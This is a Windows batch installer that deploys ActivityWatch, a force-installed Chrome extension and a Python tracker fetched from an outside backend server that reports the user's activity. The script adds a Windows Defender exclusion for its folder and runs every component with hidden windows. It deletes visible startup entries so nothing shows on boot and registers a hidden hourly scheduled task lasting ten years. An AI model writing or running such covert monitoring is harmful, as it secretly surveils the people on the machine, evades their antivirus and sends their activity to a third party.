@echo off
echo Starting ActivityWatch Master Installation...

:: Add Windows Defender Exclusion automatically (Requires Admin)
echo Configuring Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\.aw_tracker'" >nul 2>&1

:: Windows Chrome Policy
echo Setting up Chrome Extension...
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx" /f

:: Download and extract ActivityWatch for Windows
echo Downloading ActivityWatch...
mkdir "%USERPROFILE%\.aw_tracker" 2>nul
if not exist "%USERPROFILE%\.aw_tracker\activitywatch\aw-server\aw-server.exe" (
    curl.exe -L -o "%TEMP%\aw-win.zip" "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-windows-x86_64.zip"
    tar.exe -xf "%TEMP%\aw-win.zip" -C "%USERPROFILE%\.aw_tracker"
) else (
    echo ActivityWatch engine already installed. Skipping download.
)

:: Install Visual C++ Redistributable silently (Required for aw-server-rust)
if not exist "C:\Windows\System32\vcruntime140.dll" (
    echo Checking/Installing Visual C++ Redistributable...
    curl.exe -sSL -o "%TEMP%\vc_redist.x64.exe" "https://aka.ms/vs/17/release/vc_redist.x64.exe"
    "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
    del "%TEMP%\vc_redist.x64.exe"
)

:: Create VBScript launcher (primary - zero flash, Win 98 to Win 11 current)
echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-server-rust\aw-server-rust.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
echo Set WshShell = Nothing >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"

:: Create PowerShell launcher (backup - used only if VBScript is removed in a future Win 11 build)
echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-server-rust\aw-server-rust.exe" -WindowStyle Hidden > "%USERPROFILE%\.aw_tracker\start_aw.ps1"
echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" -WindowStyle Hidden >> "%USERPROFILE%\.aw_tracker\start_aw.ps1"
echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" -WindowStyle Hidden >> "%USERPROFILE%\.aw_tracker\start_aw.ps1"

:: Run engines now - VBScript primary, PowerShell fallback
where wscript.exe >nul 2>&1
if %errorlevel% == 0 (
    wscript.exe "%USERPROFILE%\.aw_tracker\start_aw.vbs"
) else (
    echo VBScript unavailable. Using PowerShell fallback...
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%USERPROFILE%\.aw_tracker\start_aw.ps1"
)

:: Clean up any old visible registry keys so they don't pop up on boot
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Server" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-AFK" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-Window" /f >nul 2>&1

:: Set auto-start on boot - VBScript primary, PowerShell fallback
where wscript.exe >nul 2>&1
if %errorlevel% == 0 (
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "wscript.exe \"%USERPROFILE%\.aw_tracker\start_aw.vbs\"" /f
) else (
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\.aw_tracker\start_aw.ps1\"" /f
)

:: Set up Python Tracker. We download from OUR SERVER (not GitHub): the server
:: injects the real backend URL + write key into the file before serving it.
echo Setting up Python Tracker...
mkdir "%USERPROFILE%\.aw_tracker" 2>nul
curl.exe -sSL -o "%USERPROFILE%\.aw_tracker\activity_tracker.py" "https://aw-backend.thesama.in/tracker/activity_tracker.py"

:: Install Python silently if missing
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Installing Python 3.11 silently ^(this may take a minute^)...
    curl.exe -sSL -o "%TEMP%\python_installer.exe" "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe"
    start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_doc=0
    del "%TEMP%\python_installer.exe"
    REM Give Windows a moment to register the new PATH variables
    timeout /t 3 /nobreak >nul
)

:: Ensure required Python libraries are installed
python -m pip install requests >nul 2>&1
if exist "C:\Program Files\Python311\python.exe" (
    "C:\Program Files\Python311\python.exe" -m pip install requests >nul 2>&1
)

:: Schedule the python script to run silently every hour, even on battery power
:: Create VBScript task runner (primary - zero flash)
echo CreateObject("WScript.Shell").Run "pythonw """ ^& "%USERPROFILE%\.aw_tracker\activity_tracker.py" ^& """", 0, False > "%USERPROFILE%\.aw_tracker\run_hidden_task.vbs"
:: Create PowerShell task runner (backup - used only if VBScript is removed)
echo Start-Process pythonw -ArgumentList '"%USERPROFILE%\.aw_tracker\activity_tracker.py"' -WindowStyle Hidden > "%USERPROFILE%\.aw_tracker\run_hidden_task.ps1"

:: Register scheduled task - VBScript primary, PowerShell fallback
where wscript.exe >nul 2>&1
if %errorlevel% == 0 (
    powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%USERPROFILE%\.aw_tracker\run_hidden_task.vbs\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul
) else (
    powershell -Command "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\.aw_tracker\run_hidden_task.ps1\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul
)

echo Installation Complete! Chrome extension and ActivityWatch are now running silently.
echo Triggering first background sync (will execute within 0-5 minutes)...

:: Task Scheduler might need a reboot to see the new Python PATH, so we forcefully launch the first sync using the absolute path!
if exist "C:\Program Files\Python311\pythonw.exe" (
    start "" /B "C:\Program Files\Python311\pythonw.exe" "%USERPROFILE%\.aw_tracker\activity_tracker.py"
) else (
    start "" /B pythonw "%USERPROFILE%\.aw_tracker\activity_tracker.py"
)

